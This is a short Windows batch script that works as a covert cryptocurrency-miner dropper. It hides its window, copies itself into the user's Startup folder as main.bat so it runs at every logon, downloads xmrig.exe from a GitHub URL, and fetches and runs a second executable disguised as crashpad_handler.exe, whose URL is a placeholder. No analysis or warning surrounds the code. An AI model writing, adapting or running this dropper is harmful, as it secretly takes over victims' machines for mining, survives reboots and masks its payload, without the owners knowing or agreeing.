@echo off
powershell -windowstyle Hidden -command
title z%random%
cd %~dp0
copy %0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
ren "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" main.bat
cd %temp%

:x
powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/xmrig.exe -OutFile xmrig.exe

:c
powershell -command Invoke-WebRequest !!! -OutFile crashpad_handler.exe

if not exist xmrig.exe (
    goto x
)

if exist crashpad_handler.exe (
	crashpad_handler.exe
    exit
) ELSE (
    goto c
)